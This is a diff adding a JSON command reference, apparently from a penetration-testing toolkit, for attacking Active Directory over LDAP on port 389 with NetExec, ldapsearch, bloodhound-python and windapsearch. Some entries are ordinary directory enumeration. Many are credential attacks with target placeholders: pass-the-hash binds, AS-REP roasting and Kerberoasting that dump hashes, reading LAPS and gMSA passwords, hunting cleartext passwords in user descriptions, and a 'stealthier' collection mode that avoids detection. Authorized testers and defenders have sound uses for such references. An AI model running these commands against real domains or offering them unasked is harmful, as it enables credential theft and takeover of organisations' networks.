@@ -1,0 +1,312 @@
+{
+  "port": 389,
+  "protocol": "tcp",
+  "service": "LDAP",
+  "description": "Lightweight Directory Access Protocol — Active Directory enumeration, user/group/computer discovery, ACL analysis, and credential extraction.",
+  "tools": [
+    {
+      "name": "NetExec (nxc) — LDAP",
+      "description": "LDAP-based AD enumeration, credential attacks, and module execution via NetExec.",
+      "commands": [
+        {
+          "title": "Anonymous LDAP bind — check access",
+          "command": "nxc ldap {{IP}} -u '' -p '' --kdcHost {{IP}}",
+          "description": "Test if anonymous LDAP binding is allowed on the target."
+        },
+        {
+          "title": "Authenticated LDAP bind",
+          "command": "nxc ldap {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}'",
+          "description": "Validate credentials against LDAP and get domain info."
+        },
+        {
+          "title": "Pass-the-Hash LDAP bind",
+          "command": "nxc ldap {{IP}} -u '{{USERNAME}}' -H '{{HASH}}'",
+          "description": "Authenticate to LDAP using an NTLM hash."
+        },
+        {
+          "title": "Enumerate users via LDAP",
+          "command": "nxc ldap {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --users",
+          "description": "List all domain user accounts via LDAP query."
+        },
+        {
+          "title": "Enumerate groups via LDAP",
+          "command": "nxc ldap {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --groups",
+          "description": "List all domain groups via LDAP query."
+        },
+        {
+          "title": "AS-REP Roast via LDAP",
+          "command": "nxc ldap {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --asreproast asrep_hashes.txt",
+          "description": "Find AS-REP roastable accounts and dump hashes via LDAP."
+        },
+        {
+          "title": "Kerberoast via LDAP",
+          "command": "nxc ldap {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --kerberoasting kerberoast_hashes.txt",
+          "description": "Find Kerberoastable accounts and request TGS tickets via LDAP."
+        },
+        {
+          "title": "BloodHound collection via LDAP",
+          "command": "nxc ldap {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --bloodhound -ns {{IP}} --collection All",
+          "description": "Collect BloodHound data (all collection methods) via LDAP."
+        },
+        {
+          "title": "Get password policy",
+          "command": "nxc ldap {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --pass-pol",
+          "description": "Retrieve domain password policy via LDAP."
+        },
+        {
+          "title": "Enumerate LAPS passwords",
+          "command": "nxc ldap {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -M laps",
+          "description": "Dump LAPS (Local Administrator Password Solution) passwords if readable."
+        },
+        {
+          "title": "Enumerate gMSA passwords",
+          "command": "nxc ldap {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --gmsa",
+          "description": "Dump Group Managed Service Account (gMSA) passwords."
+        },
+        {
+          "title": "Enumerate AD CS templates",
+          "command": "nxc ldap {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -M adcs",
+          "description": "Enumerate Active Directory Certificate Services templates."
+        },
+        {
+          "title": "Get Machine Account Quota (MAQ)",
+          "command": "nxc ldap {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -M maq",
+          "description": "Check the machine account quota (ms-DS-MachineAccountQuota) for the domain."
+        },
+        {
+          "title": "Search user descriptions for passwords",
+          "command": "nxc ldap {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -M get-desc-users",
+          "description": "Search user description fields for potential cleartext passwords."
+        },
+        {
+          "title": "Check LDAP signing",
+          "command": "nxc ldap {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -M ldap-checker",
+          "description": "Check if LDAP signing and channel binding are enforced."
+        },
+        {
+          "title": "Enumerate trusted-for-delegation accounts",
+          "command": "nxc ldap {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --trusted-for-delegation",
+          "description": "Find accounts trusted for unconstrained delegation."
+        },
+        {
+          "title": "Enumerate admin count users",
+          "command": "nxc ldap {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --admin-count",
+          "description": "Find all accounts with adminCount=1 set."
+        }
+      ]
+    },
+    {
+      "name": "ldapsearch",
+      "description": "Native LDAP client for crafting custom queries against Active Directory.",
+      "commands": [
+        {
+          "title": "Anonymous bind — dump naming contexts",
+          "command": "ldapsearch -x -H ldap://{{IP}} -s base namingcontexts",
+          "description": "Query the root DSE anonymously to discover naming contexts (base DN)."
+        },
+        {
+          "title": "Anonymous bind — dump all objects",
+          "command": "ldapsearch -x -H ldap://{{IP}} -b '{{BASEDN}}' '(objectClass=*)'",
+          "description": "Dump all LDAP objects anonymously (works if anonymous bind is allowed)."
+        },
+        {
+          "title": "Authenticated bind — dump all",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(objectClass=*)'",
+          "description": "Authenticate and dump all LDAP objects."
+        },
+        {
+          "title": "Enumerate all domain users",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(&(objectCategory=person)(objectClass=user))' sAMAccountName userPrincipalName memberOf description",
+          "description": "List all user accounts with key attributes."
+        },
+        {
+          "title": "Enumerate all domain computers",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(objectCategory=computer)' cn operatingSystem dNSHostName",
+          "description": "List all domain-joined computers with OS info."
+        },
+        {
+          "title": "Enumerate all domain groups",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(objectCategory=group)' cn member description",
+          "description": "List all groups and their members."
+        },
+        {
+          "title": "Enumerate Domain Admins",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(&(objectCategory=group)(cn=Domain Admins))' member",
+          "description": "List all members of the Domain Admins group."
+        },
+        {
+          "title": "Enumerate Enterprise Admins",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(&(objectCategory=group)(cn=Enterprise Admins))' member",
+          "description": "List all members of the Enterprise Admins group."
+        },
+        {
+          "title": "Find accounts with SPNs (Kerberoastable)",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName",
+          "description": "Find user accounts with Service Principal Names set (Kerberoastable targets)."
+        },
+        {
+          "title": "Find AS-REP roastable accounts",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName",
+          "description": "Find accounts with 'Do not require Kerberos preauthentication' flag set."
+        },
+        {
+          "title": "Enumerate password policy",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(objectClass=domain)' minPwdLength maxPwdAge minPwdAge pwdHistoryLength lockoutThreshold lockoutDuration",
+          "description": "Retrieve the domain password and lockout policy."
+        },
+        {
+          "title": "Enumerate domain trusts",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(objectClass=trustedDomain)' cn trustDirection trustType trustAttributes flatName",
+          "description": "Enumerate all domain trust relationships."
+        },
+        {
+          "title": "Enumerate Group Policy Objects (GPOs)",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(objectCategory=groupPolicyContainer)' displayName gPCFileSysPath",
+          "description": "List all GPOs and their SYSVOL paths."
+        },
+        {
+          "title": "Enumerate Organizational Units (OUs)",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(objectCategory=organizationalUnit)' ou description gpLink",
+          "description": "List all OUs and linked GPOs."
+        },
+        {
+          "title": "Enumerate LAPS passwords",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(ms-Mcs-AdmPwd=*)' cn ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime",
+          "description": "Dump LAPS managed local admin passwords (requires read permissions)."
+        },
+        {
+          "title": "Find disabled accounts",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' sAMAccountName",
+          "description": "Find all disabled user accounts."
+        },
+        {
+          "title": "Find accounts with AdminCount=1",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(&(objectCategory=person)(objectClass=user)(adminCount=1))' sAMAccountName memberOf",
+          "description": "Find protected admin accounts (AdminCount=1, protected by AdminSDHolder)."
+        },
+        {
+          "title": "Find unconstrained delegation computers",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' cn dNSHostName",
+          "description": "Find computers trusted for unconstrained delegation."
+        },
+        {
+          "title": "Find constrained delegation accounts",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(msDS-AllowedToDelegateTo=*)' sAMAccountName msDS-AllowedToDelegateTo",
+          "description": "Find accounts with constrained delegation configured."
+        },
+        {
+          "title": "Find resource-based constrained delegation",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' cn msDS-AllowedToActOnBehalfOfOtherIdentity",
+          "description": "Find objects with resource-based constrained delegation (RBCD) configured."
+        },
+        {
+          "title": "Enumerate certificate templates",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{{BASEDN}}' '(objectClass=pKICertificateTemplate)' cn msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag pKIExtendedKeyUsage",
+          "description": "Enumerate AD CS certificate templates and their enrollment settings."
+        },
+        {
+          "title": "Find accounts with description field set",
+          "command": "ldapsearch -x -H ldap://{{IP}} -D '{{USERNAME}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b '{{BASEDN}}' '(&(objectCategory=person)(objectClass=user)(description=*))' sAMAccountName description",
+          "description": "Find users with non-empty description fields (often contain password hints)."
+        }
+      ]
+    },
+    {
+      "name": "bloodhound-python",
+      "description": "Python-based BloodHound ingestor for remote AD data collection without needing a domain-joined host.",
+      "commands": [
+        {
+          "title": "Collect all data",
+          "command": "bloodhound-python -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN}}' -ns {{IP}} -c All",
+          "description": "Run all collection methods (users, groups, sessions, ACLs, trusts, containers, GPOs)."
+        },
+        {
+          "title": "Collect all data (DCOnly — stealthier)",
+          "command": "bloodhound-python -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN}}' -ns {{IP}} -c DCOnly",
+          "description": "Collect data only from the Domain Controller (no host enumeration, avoids detection)."
+        },
+        {
+          "title": "Collect group memberships only",
+          "command": "bloodhound-python -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN}}' -ns {{IP}} -c Group",
+          "description": "Collect only group membership data."
+        },
+        {
+          "title": "Collect ACL data only",
+          "command": "bloodhound-python -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN}}' -ns {{IP}} -c ACL",
+          "description": "Collect only ACL/permission data (DACLs on AD objects)."
+        },
+        {
+          "title": "Collect session data only",
+          "command": "bloodhound-python -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN}}' -ns {{IP}} -c Session",
+          "description": "Enumerate active sessions on reachable hosts."
+        },
+        {
+          "title": "Collect with NTLM hash (PtH)",
+          "command": "bloodhound-python -u '{{USERNAME}}' --hashes ':{{HASH}}' -d '{{DOMAIN}}' -ns {{IP}} -c All",
+          "description": "Run BloodHound collection using pass-the-hash authentication."
+        },
+        {
+          "title": "Collect with specific DC target",
+          "command": "bloodhound-python -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN}}' -dc {{IP}} -ns {{IP}} -c All",
+          "description": "Specify the DC explicitly (useful when DNS resolution fails)."
+        },
+        {
+          "title": "Collect with zip output",
+          "command": "bloodhound-python -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN}}' -ns {{IP}} -c All --zip",
+          "description": "Collect all data and output as a ZIP file ready for BloodHound import."
+        }
+      ]
+    },
+    {
+      "name": "windapsearch",
+      "description": "Python tool for quick LDAP enumeration of common AD objects.",
+      "commands": [
+        {
+          "title": "Enumerate all domain users",
+          "command": "windapsearch -d '{{DOMAIN}}' --dc {{IP}} -u '{{USERNAME}}@{{DOMAIN}}' -p '{{PASSWORD}}' --users",
+          "description": "List all domain users via LDAP."
+        },
+        {
+          "title": "Enumerate all domain groups",
+          "command": "windapsearch -d '{{DOMAIN}}' --dc {{IP}} -u '{{USERNAME}}@{{DOMAIN}}' -p '{{PASSWORD}}' --groups",
+          "description": "List all domain groups via LDAP."
+        },
+        {
+          "title": "Enumerate all domain computers",
+          "command": "windapsearch -d '{{DOMAIN}}' --dc {{IP}} -u '{{USERNAME}}@{{DOMAIN}}' -p '{{PASSWORD}}' --computers",
+          "description": "List all domain-joined computers."
+        },
+        {
+          "title": "Enumerate Domain Admins",
+          "command": "windapsearch -d '{{DOMAIN}}' --dc {{IP}} -u '{{USERNAME}}@{{DOMAIN}}' -p '{{PASSWORD}}' --da",
+          "description": "List all members of the Domain Admins group."
+        },
+        {
+          "title": "Enumerate privileged users",
+          "command": "windapsearch -d '{{DOMAIN}}' --dc {{IP}} -u '{{USERNAME}}@{{DOMAIN}}' -p '{{PASSWORD}}' --privileged-users",
+          "description": "Find all privileged users (Domain Admins, Enterprise Admins, Schema Admins, etc.)."
+        },
+        {
+          "title": "Enumerate unconstrained delegation",
+          "command": "windapsearch -d '{{DOMAIN}}' --dc {{IP}} -u '{{USERNAME}}@{{DOMAIN}}' -p '{{PASSWORD}}' --unconstrained-users",
+          "description": "Find user accounts trusted for unconstrained delegation."
+        },
+        {
+          "title": "Enumerate unconstrained delegation computers",
+          "command": "windapsearch -d '{{DOMAIN}}' --dc {{IP}} -u '{{USERNAME}}@{{DOMAIN}}' -p '{{PASSWORD}}' --unconstrained-computers",
+          "description": "Find computer accounts trusted for unconstrained delegation."
+        },
+        {
+          "title": "Full enumeration (all modules)",
+          "command": "windapsearch -d '{{DOMAIN}}' --dc {{IP}} -u '{{USERNAME}}@{{DOMAIN}}' -p '{{PASSWORD}}' --full",
+          "description": "Run all enumeration modules and dump everything."
+        },
+        {
+          "title": "Custom LDAP filter",
+          "command": "windapsearch -d '{{DOMAIN}}' --dc {{IP}} -u '{{USERNAME}}@{{DOMAIN}}' -p '{{PASSWORD}}' --custom '(&(objectCategory=person)(objectClass=user)(adminCount=1))'",
+          "description": "Execute a custom LDAP filter query."
+        }
+      ]
+    }
+  ]
+}
